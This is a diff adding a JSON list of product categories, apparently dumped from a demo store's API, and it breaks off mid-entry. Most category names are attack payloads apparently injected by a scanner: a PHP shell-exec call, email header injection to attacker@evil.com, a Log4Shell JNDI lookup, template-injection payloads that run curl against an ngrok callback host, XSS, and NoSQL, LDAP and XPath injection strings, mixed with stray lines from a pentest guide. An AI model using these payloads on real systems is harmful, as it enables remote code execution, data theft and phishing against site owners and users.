@@ -1,0 +1,2650 @@
+[
+    {
+        "id": 1,
+        "name": "Clothes",
+        "slug": "clothes",
+        "image": "https://i.imgur.com/QkIa5tT.jpeg",
+        "creationAt": "2026-03-16T23:33:54.000Z",
+        "updatedAt": "2026-03-17T05:32:40.000Z"
+    },
+    {
+        "id": 2,
+        "name": "<?php pcntl_exec('/bin/sh', ['-c', 'id']); ?>",
+        "slug": "php-pcntl-exec-bin-sh-c-id",
+        "image": "https://i.imgur.com/ZANVnHE.jpeg",
+        "creationAt": "2026-03-16T23:33:54.000Z",
+        "updatedAt": "2026-03-17T17:52:41.000Z"
+    },
+    {
+        "id": 3,
+        "name": "Furniture",
+        "slug": "furniture",
+        "image": "https://i.imgur.com/Qphac99.jpeg",
+        "creationAt": "2026-03-16T23:33:54.000Z",
+        "updatedAt": "2026-03-16T23:33:54.000Z"
+    },
+    {
+        "id": 4,
+        "name": "tenis corrida",
+        "slug": "tenis-corrida",
+        "image": "https://onelink.shein.com/0/googlefeed_br?goods_id=325810272&lang=pt&currency=BRL&skucode=I2mj5y0zdfae2o&ismg=824bca1d92a539d55cb6f2c7611f24bcebfcca7c008e64ac227b11e43524d9c5_01_1773743251",
+        "creationAt": "2026-03-16T23:33:54.000Z",
+        "updatedAt": "2026-03-17T17:13:47.000Z"
+    },
+    {
+        "id": 5,
+        "name": "Miscellaneous",
+        "slug": "miscellaneous",
+        "image": "https://i.imgur.com/BG8J0Fj.jpg",
+        "creationAt": "2026-03-16T23:33:54.000Z",
+        "updatedAt": "2026-03-16T23:33:54.000Z"
+    },
+    {
+        "id": 399,
+        "name": "victim@test.com%0aCc:attacker@evil.com",
+        "slug": "victim-test-com-0acc-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:54.000Z",
+        "updatedAt": "2026-03-17T15:59:54.000Z"
+    },
+    {
+        "id": 400,
+        "name": "victim@test.com%0aBcc:attacker@evil.com",
+        "slug": "victim-test-com-0abcc-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:54.000Z",
+        "updatedAt": "2026-03-17T15:59:54.000Z"
+    },
+    {
+        "id": 401,
+        "name": "victim@test.com%0d%0aCc:attacker@evil.com",
+        "slug": "victim-test-com-0d-0acc-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:55.000Z",
+        "updatedAt": "2026-03-17T15:59:55.000Z"
+    },
+    {
+        "id": 402,
+        "name": "victim@test.com%0d%0aBcc:attacker@evil.com",
+        "slug": "victim-test-com-0d-0abcc-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:55.000Z",
+        "updatedAt": "2026-03-17T15:59:55.000Z"
+    },
+    {
+        "id": 403,
+        "name": "victim@test.com\\nCc:attacker@evil.com",
+        "slug": "victim-test-com-ncc-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:55.000Z",
+        "updatedAt": "2026-03-17T15:59:55.000Z"
+    },
+    {
+        "id": 404,
+        "name": "victim@test.com\\r\\nBcc:attacker@evil.com",
+        "slug": "victim-test-com-r-nbcc-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:56.000Z",
+        "updatedAt": "2026-03-17T15:59:56.000Z"
+    },
+    {
+        "id": 405,
+        "name": "victim@test.com\nSubject:Phishing Email",
+        "slug": "victim-test-com-subject-phishing-email",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:56.000Z",
+        "updatedAt": "2026-03-17T15:59:56.000Z"
+    },
+    {
+        "id": 406,
+        "name": "victim@test.com%0aSubject:URGENT-Password Reset",
+        "slug": "victim-test-com-0asubject-urgent-password-reset",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:56.000Z",
+        "updatedAt": "2026-03-17T15:59:56.000Z"
+    },
+    {
+        "id": 407,
+        "name": "victim@test.com%0aContent-Type:text/html",
+        "slug": "victim-test-com-0acontent-type-text-html",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:57.000Z",
+        "updatedAt": "2026-03-17T15:59:57.000Z"
+    },
+    {
+        "id": 408,
+        "name": "victim@test.com%0a%0a<html><body>Phishing content</body></html>",
+        "slug": "victim-test-com-0a-0a-html-body-phishing-content-body-html",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:57.000Z",
+        "updatedAt": "2026-03-17T15:59:57.000Z"
+    },
+    {
+        "id": 409,
+        "name": "victim@test.com%0aFrom:admin@legitimate.com",
+        "slug": "victim-test-com-0afrom-admin-legitimate-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:57.000Z",
+        "updatedAt": "2026-03-17T15:59:57.000Z"
+    },
+    {
+        "id": 410,
+        "name": "victim@test.com%0aReply-To:attacker@evil.com",
+        "slug": "victim-test-com-0areply-to-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:58.000Z",
+        "updatedAt": "2026-03-17T15:59:58.000Z"
+    },
+    {
+        "id": 411,
+        "name": "victim@test.com%0aX-Mailer:EvilMailer",
+        "slug": "victim-test-com-0ax-mailer-evilmailer",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:58.000Z",
+        "updatedAt": "2026-03-17T15:59:58.000Z"
+    },
+    {
+        "id": 412,
+        "name": "victim@test.com%0aReturn-Path:attacker@evil.com",
+        "slug": "victim-test-com-0areturn-path-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:59.000Z",
+        "updatedAt": "2026-03-17T15:59:59.000Z"
+    },
+    {
+        "id": 413,
+        "name": "victim@test.com%0aMIME-Version:1.0%0aContent-Type:multipart/mixed;boundary=evil",
+        "slug": "victim-test-com-0amime-version-1-0-0acontent-type-multipart-mixed-boundary-evil",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:59.000Z",
+        "updatedAt": "2026-03-17T15:59:59.000Z"
+    },
+    {
+        "id": 414,
+        "name": "victim@test.com%0a--evil%0aContent-Type:text/html%0a%0a<script>alert(1)</script>%0a--evil--",
+        "slug": "victim-test-com-0a-evil-0acontent-type-text-html-0a-0a-script-alert-1-script-0a-evil",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T15:59:59.000Z",
+        "updatedAt": "2026-03-17T15:59:59.000Z"
+    },
+    {
+        "id": 415,
+        "name": "victim@test.com%0aContent-Transfer-Encoding:base64",
+        "slug": "victim-test-com-0acontent-transfer-encoding-base64",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:00.000Z",
+        "updatedAt": "2026-03-17T16:00:00.000Z"
+    },
+    {
+        "id": 416,
+        "name": "victim@test.com%0aContent-Disposition:attachment;filename=evil.exe",
+        "slug": "victim-test-com-0acontent-disposition-attachment-filename-evil-exe",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:00.000Z",
+        "updatedAt": "2026-03-17T16:00:00.000Z"
+    },
+    {
+        "id": 417,
+        "name": "admin%0d%0a[INFO] User logged in successfully",
+        "slug": "admin-0d-0a-info-user-logged-in-successfully",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:00.000Z",
+        "updatedAt": "2026-03-17T16:00:00.000Z"
+    },
+    {
+        "id": 418,
+        "name": "victim@test.com>,attacker@evil.com<",
+        "slug": "victim-test-com-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:00.000Z",
+        "updatedAt": "2026-03-17T16:00:00.000Z"
+    },
+    {
+        "id": 419,
+        "name": "test\\n[CRITICAL] System compromised",
+        "slug": "test-n-critical-system-compromised",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:01.000Z",
+        "updatedAt": "2026-03-17T16:00:01.000Z"
+    },
+    {
+        "id": 420,
+        "name": "${jndi:ldap://attacker.com/a}",
+        "slug": "jndi-ldap-attacker-com-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:01.000Z",
+        "updatedAt": "2026-03-17T16:00:01.000Z"
+    },
+    {
+        "id": 421,
+        "name": "\"victim@test.com\nCc:attacker@evil.com\"",
+        "slug": "victim-test-com-cc-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:01.000Z",
+        "updatedAt": "2026-03-17T16:00:01.000Z"
+    },
+    {
+        "id": 422,
+        "name": "victim@test.com%00attacker@evil.com",
+        "slug": "victim-test-com-00attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:01.000Z",
+        "updatedAt": "2026-03-17T16:00:01.000Z"
+    },
+    {
+        "id": 423,
+        "name": "victim@test.com%0aX-Priority:1",
+        "slug": "victim-test-com-0ax-priority-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:02.000Z",
+        "updatedAt": "2026-03-17T16:00:02.000Z"
+    },
+    {
+        "id": 424,
+        "name": "victim@test.com%0aImportance:high",
+        "slug": "victim-test-com-0aimportance-high",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:02.000Z",
+        "updatedAt": "2026-03-17T16:00:02.000Z"
+    },
+    {
+        "id": 425,
+        "name": "victim@test.com%0aDisposition-Notification-To:attacker@evil.com",
+        "slug": "victim-test-com-0adisposition-notification-to-attacker-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:02.000Z",
+        "updatedAt": "2026-03-17T16:00:02.000Z"
+    },
+    {
+        "id": 426,
+        "name": "victim@test.com%0aList-Unsubscribe:<http://attacker.com>",
+        "slug": "victim-test-com-0alist-unsubscribe-http-attacker-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:03.000Z",
+        "updatedAt": "2026-03-17T16:00:03.000Z"
+    },
+    {
+        "id": 427,
+        "name": "victim@test.com%0aX-Originating-IP:127.0.0.1",
+        "slug": "victim-test-com-0ax-originating-ip-127-0-0-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:03.000Z",
+        "updatedAt": "2026-03-17T16:00:03.000Z"
+    },
+    {
+        "id": 428,
+        "name": "victim@test.com%0aReceived:from attacker.com",
+        "slug": "victim-test-com-0areceived-from-attacker-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:04.000Z",
+        "updatedAt": "2026-03-17T16:00:04.000Z"
+    },
+    {
+        "id": 429,
+        "name": "victim@test.com%0aMessage-ID:<evil@attacker.com>",
+        "slug": "victim-test-com-0amessage-id-evil-attacker-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:04.000Z",
+        "updatedAt": "2026-03-17T16:00:04.000Z"
+    },
+    {
+        "id": 430,
+        "name": "victim@test.com%0aDate:Mon,01Jan200100:00:00+0000",
+        "slug": "victim-test-com-0adate-mon-01jan200100-00-00-0000",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:04.000Z",
+        "updatedAt": "2026-03-17T16:00:04.000Z"
+    },
+    {
+        "id": 431,
+        "name": "victim@test.com%0aIn-Reply-To:<original@legitimate.com>",
+        "slug": "victim-test-com-0ain-reply-to-original-legitimate-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:00:05.000Z",
+        "updatedAt": "2026-03-17T16:00:05.000Z"
+    },
+    {
+        "id": 433,
+        "name": "<svg><style><img src=x onerror=alert('mxsse9647d7c')>",
+        "slug": "svg-style-img-src-x-onerror-alert-mxsse9647d7c",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:01:25.000Z",
+        "updatedAt": "2026-03-17T16:01:25.000Z"
+    },
+    {
+        "id": 434,
+        "name": "test%0d%0aSet-Cookie:session=malicious",
+        "slug": "test-0d-0aset-cookie-session-malicious",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:02.000Z",
+        "updatedAt": "2026-03-17T16:02:02.000Z"
+    },
+    {
+        "id": 435,
+        "name": "test%0d%0aX-Injected:true",
+        "slug": "test-0d-0ax-injected-true",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:03.000Z",
+        "updatedAt": "2026-03-17T16:02:03.000Z"
+    },
+    {
+        "id": 436,
+        "name": "test%0aSet-Cookie:session=malicious",
+        "slug": "test-0aset-cookie-session-malicious",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:03.000Z",
+        "updatedAt": "2026-03-17T16:02:03.000Z"
+    },
+    {
+        "id": 437,
+        "name": "test%0d%0a%0d%0a<html>injected</html>",
+        "slug": "test-0d-0a-0d-0a-html-injected-html",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:03.000Z",
+        "updatedAt": "2026-03-17T16:02:03.000Z"
+    },
+    {
+        "id": 439,
+        "name": "{{7*7}}",
+        "slug": "7-7",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:04.000Z",
+        "updatedAt": "2026-03-17T16:02:04.000Z"
+    },
+    {
+        "id": 440,
+        "name": "{% import os %}{{ os.popen(\"curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/69e25e24e1fef336d2d1/ssti\").read() }}",
+        "slug": "import-os-os-popen-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-69e25e24e1fef336d2d1-ssti-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:13.000Z",
+        "updatedAt": "2026-03-17T16:02:13.000Z"
+    },
+    {
+        "id": 441,
+        "name": "${\"https://uncloyed-eden-soughfully.ngrok-free.dev/i/69e25e24e1fef336d2d1/ssti\"?url?content}",
+        "slug": "https-uncloyed-eden-soughfully-ngrok-free-dev-i-69e25e24e1fef336d2d1-ssti-url-content",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:13.000Z",
+        "updatedAt": "2026-03-17T16:02:13.000Z"
+    },
+    {
+        "id": 442,
+        "name": "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))#set($chr=$x.class.forName(\"java.lang.Character\"))#set($str=$x.class.forName(\"java.lang.String\"))#set($ex=$rt.getRuntime().exec(\"curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/69e25e24e1fef336d2d1/ssti\"))$ex.waitFor()",
+        "slug": "set-x-set-rt-x-class-forname-java-lang-runtime-set-chr-x-class-forname-java-lang-character-set-str-x-class-forname-java-lang-string-set-ex-rt-getruntime-exec-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-69e25e24e1fef336d2d1-ssti-ex-waitfor",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:14.000Z",
+        "updatedAt": "2026-03-17T16:02:14.000Z"
+    },
+    {
+        "id": 443,
+        "name": "{{[\"curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/69e25e24e1fef336d2d1/ssti\"]|filter(\"system\")}}",
+        "slug": "curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-69e25e24e1fef336d2d1-ssti-filter-system",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:14.000Z",
+        "updatedAt": "2026-03-17T16:02:14.000Z"
+    },
+    {
+        "id": 444,
+        "name": "<%= `curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/69e25e24e1fef336d2d1/ssti` %>",
+        "slug": "curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-69e25e24e1fef336d2d1-ssti",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:14.000Z",
+        "updatedAt": "2026-03-17T16:02:14.000Z"
+    },
+    {
+        "id": 447,
+        "name": "[object Object]",
+        "slug": "object-object",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:34.000Z",
+        "updatedAt": "2026-03-17T16:02:34.000Z"
+    },
+    {
+        "id": 448,
+        "name": "{\"$gt\": undefined}",
+        "slug": "gt-undefined",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:35.000Z",
+        "updatedAt": "2026-03-17T16:02:35.000Z"
+    },
+    {
+        "id": 449,
+        "name": "<script>alert('xsseebdb06c')</script>",
+        "slug": "script-alert-xsseebdb06c-script",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:53.000Z",
+        "updatedAt": "2026-03-17T16:02:53.000Z"
+    },
+    {
+        "id": 450,
+        "name": "{\"$gt\": \"\"}<!-- SO2ND_nosqli_733d95ed -->",
+        "slug": "gt-so2nd-nosqli-733d95ed",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:02:57.000Z",
+        "updatedAt": "2026-03-17T16:02:57.000Z"
+    },
+    {
+        "id": 451,
+        "name": "<img src=x onerror=alert('SO2ND_xss_e7b078f5'+1)>",
+        "slug": "img-src-x-onerror-alert-so2nd-xss-e7b078f5-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:14.000Z",
+        "updatedAt": "2026-03-17T16:03:14.000Z"
+    },
+    {
+        "id": 452,
+        "name": "*",
+        "slug": "",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:23.000Z",
+        "updatedAt": "2026-03-17T16:03:23.000Z"
+    },
+    {
+        "id": 453,
+        "name": "\\x00",
+        "slug": "x00",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:25.000Z",
+        "updatedAt": "2026-03-17T16:03:25.000Z"
+    },
+    {
+        "id": 454,
+        "name": "*))%00",
+        "slug": "00",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:28.000Z",
+        "updatedAt": "2026-03-17T16:03:28.000Z"
+    },
+    {
+        "id": 455,
+        "name": "*()|%26'",
+        "slug": "26",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:29.000Z",
+        "updatedAt": "2026-03-17T16:03:29.000Z"
+    },
+    {
+        "id": 456,
+        "name": "*(|(mail=*))",
+        "slug": "mail",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:29.000Z",
+        "updatedAt": "2026-03-17T16:03:29.000Z"
+    },
+    {
+        "id": 457,
+        "name": "*(|(objectclass=*))",
+        "slug": "objectclass",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:30.000Z",
+        "updatedAt": "2026-03-17T16:03:30.000Z"
+    },
+    {
+        "id": 458,
+        "name": "*)(uid=*))(|(uid=*",
+        "slug": "uid-uid",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:30.000Z",
+        "updatedAt": "2026-03-17T16:03:30.000Z"
+    },
+    {
+        "id": 459,
+        "name": "admin*",
+        "slug": "admin",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:33.000Z",
+        "updatedAt": "2026-03-17T16:03:33.000Z"
+    },
+    {
+        "id": 460,
+        "name": "admin*)((|userpassword=*)",
+        "slug": "admin-userpassword",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:34.000Z",
+        "updatedAt": "2026-03-17T16:03:34.000Z"
+    },
+    {
+        "id": 461,
+        "name": "*)(cn=*",
+        "slug": "cn",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:38.000Z",
+        "updatedAt": "2026-03-17T16:03:38.000Z"
+    },
+    {
+        "id": 462,
+        "name": "cn=*,dc=",
+        "slug": "cn-dc",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:41.000Z",
+        "updatedAt": "2026-03-17T16:03:41.000Z"
+    },
+    {
+        "id": 463,
+        "name": "cn=test,",
+        "slug": "cn-test",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:42.000Z",
+        "updatedAt": "2026-03-17T16:03:42.000Z"
+    },
+    {
+        "id": 464,
+        "name": ",dc=com",
+        "slug": "dc-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:42.000Z",
+        "updatedAt": "2026-03-17T16:03:42.000Z"
+    },
+    {
+        "id": 465,
+        "name": "admin%00",
+        "slug": "admin-00",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:43.000Z",
+        "updatedAt": "2026-03-17T16:03:43.000Z"
+    },
+    {
+        "id": 466,
+        "name": "' or '1'='1",
+        "slug": "or-1-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:43.000Z",
+        "updatedAt": "2026-03-17T16:03:43.000Z"
+    },
+    {
+        "id": 467,
+        "name": "' or ''='",
+        "slug": "or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:44.000Z",
+        "updatedAt": "2026-03-17T16:03:44.000Z"
+    },
+    {
+        "id": 468,
+        "name": "x' or name()='username' or 'x'='y",
+        "slug": "x-or-name-username-or-x-y",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:44.000Z",
+        "updatedAt": "2026-03-17T16:03:44.000Z"
+    },
+    {
+        "id": 469,
+        "name": "'] | //user/*[contains(*,'",
+        "slug": "user-contains",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:45.000Z",
+        "updatedAt": "2026-03-17T16:03:45.000Z"
+    },
+    {
+        "id": 470,
+        "name": "' and count(/*)=1 and 'a'='a",
+        "slug": "and-count-1-and-a-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:45.000Z",
+        "updatedAt": "2026-03-17T16:03:45.000Z"
+    },
+    {
+        "id": 471,
+        "name": "*)(|(cn=nonexistent12345)",
+        "slug": "cn-nonexistent12345",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:45.000Z",
+        "updatedAt": "2026-03-17T16:03:45.000Z"
+    },
+    {
+        "id": 472,
+        "name": "' and string-length(name(/*[1]))=4 and 'a'='a",
+        "slug": "and-string-length-name-1-4-and-a-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:45.000Z",
+        "updatedAt": "2026-03-17T16:03:45.000Z"
+    },
+    {
+        "id": 473,
+        "name": "' and substring(name(/*[1]),1,1)='n' and 'a'='a",
+        "slug": "and-substring-name-1-1-1-n-and-a-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:46.000Z",
+        "updatedAt": "2026-03-17T16:03:46.000Z"
+    },
+    {
+        "id": 474,
+        "name": "x]|//*[",
+        "slug": "x",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:46.000Z",
+        "updatedAt": "2026-03-17T16:03:46.000Z"
+    },
+    {
+        "id": 475,
+        "name": "' or 1=1 or ''='",
+        "slug": "or-1-1-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:46.000Z",
+        "updatedAt": "2026-03-17T16:03:46.000Z"
+    },
+    {
+        "id": 476,
+        "name": "admin' or '1'='1' or 'x'='y",
+        "slug": "admin-or-1-1-or-x-y",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:47.000Z",
+        "updatedAt": "2026-03-17T16:03:47.000Z"
+    },
+    {
+        "id": 477,
+        "name": "*)(&(objectClass=nonexistent12345)",
+        "slug": "objectclass-nonexistent12345",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:47.000Z",
+        "updatedAt": "2026-03-17T16:03:47.000Z"
+    },
+    {
+        "id": 478,
+        "name": "x']//password | a]",
+        "slug": "x-password-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:47.000Z",
+        "updatedAt": "2026-03-17T16:03:47.000Z"
+    },
+    {
+        "id": 479,
+        "name": "' and '1'='1",
+        "slug": "and-1-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:48.000Z",
+        "updatedAt": "2026-03-17T16:03:48.000Z"
+    },
+    {
+        "id": 481,
+        "name": "x]/*[1]",
+        "slug": "x-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:48.000Z",
+        "updatedAt": "2026-03-17T16:03:48.000Z"
+    },
+    {
+        "id": 483,
+        "name": "' or contains(.,'admin')",
+        "slug": "or-contains-admin",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:49.000Z",
+        "updatedAt": "2026-03-17T16:03:49.000Z"
+    },
+    {
+        "id": 484,
+        "name": "New category)(|(cn=*)",
+        "slug": "new-category-cn",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:49.000Z",
+        "updatedAt": "2026-03-17T16:03:49.000Z"
+    },
+    {
+        "id": 485,
+        "name": "New category)(|(cn=nonexistent12345)",
+        "slug": "new-category-cn-nonexistent12345",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:49.000Z",
+        "updatedAt": "2026-03-17T16:03:49.000Z"
+    },
+    {
+        "id": 486,
+        "name": "New category)(|(objectClass=*)",
+        "slug": "new-category-objectclass",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:49.000Z",
+        "updatedAt": "2026-03-17T16:03:49.000Z"
+    },
+    {
+        "id": 487,
+        "name": "1. Size of a string",
+        "slug": "1-size-of-a-string",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:50.000Z",
+        "updatedAt": "2026-03-17T16:03:50.000Z"
+    },
+    {
+        "id": 488,
+        "name": "New category)(|(objectClass=nonexistent12345)",
+        "slug": "new-category-objectclass-nonexistent12345",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:50.000Z",
+        "updatedAt": "2026-03-17T16:03:50.000Z"
+    },
+    {
+        "id": 489,
+        "name": "*)(uid=*",
+        "slug": "uid",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:50.000Z",
+        "updatedAt": "2026-03-17T16:03:50.000Z"
+    },
+    {
+        "id": 490,
+        "name": "2. Access a character with `substring`, and verify its value the `codepoints-to-string` function",
+        "slug": "2-access-a-character-with-substring-and-verify-its-value-the-codepoints-to-string-function",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:50.000Z",
+        "updatedAt": "2026-03-17T16:03:50.000Z"
+    },
+    {
+        "id": 491,
+        "name": "*)(uid=nonexistent12345",
+        "slug": "uid-nonexistent12345",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:51.000Z",
+        "updatedAt": "2026-03-17T16:03:51.000Z"
+    },
+    {
+        "id": 492,
+        "name": "ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+        "slug": "ps1-string-user-name-text-vuln-var1-and-password-text-vuln-var1-account-text",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:51.000Z",
+        "updatedAt": "2026-03-17T16:03:51.000Z"
+    },
+    {
+        "id": 493,
+        "name": "sql\n    substring(//user[userid=5]/username,2,1)=CHAR_HERE\n    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)",
+        "slug": "sql-substring-user-userid-5-username-2-1-char-here-substring-user-userid-5-username-2-1-codepoints-to-string-int-ord-char-here",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:51.000Z",
+        "updatedAt": "2026-03-17T16:03:51.000Z"
+    },
+    {
+        "id": 494,
+        "name": "*)(mail=nonexistent12345@nonexistent.com",
+        "slug": "mail-nonexistent12345-nonexistent-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:51.000Z",
+        "updatedAt": "2026-03-17T16:03:51.000Z"
+    },
+    {
+        "id": 495,
+        "name": "powershell\nhttp://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')",
+        "slug": "powershell-http-example-com-title-foundation-type-rent-days-and-doc-10-10-10-10-share",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:51.000Z",
+        "updatedAt": "2026-03-17T16:03:51.000Z"
+    },
+    {
+        "id": 496,
+        "name": "*)(&(|(cn=*)(sn=*))",
+        "slug": "cn-sn",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:52.000Z",
+        "updatedAt": "2026-03-17T16:03:52.000Z"
+    },
+    {
+        "id": 497,
+        "name": "*)(&(|(cn=nonexistent12345)(sn=nonexistent12345))",
+        "slug": "cn-nonexistent12345-sn-nonexistent12345",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:53.000Z",
+        "updatedAt": "2026-03-17T16:03:53.000Z"
+    },
+    {
+        "id": 498,
+        "name": "x)(|(objectClass=*)",
+        "slug": "x-objectclass",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:54.000Z",
+        "updatedAt": "2026-03-17T16:03:54.000Z"
+    },
+    {
+        "id": 499,
+        "name": "*)(memberOf=cn=admin*)",
+        "slug": "memberof-cn-admin",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:54.000Z",
+        "updatedAt": "2026-03-17T16:03:54.000Z"
+    },
+    {
+        "id": 500,
+        "name": "x))(|(mail=*@target.com)",
+        "slug": "x-mail-target-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:55.000Z",
+        "updatedAt": "2026-03-17T16:03:55.000Z"
+    },
+    {
+        "id": 501,
+        "name": "' and '",
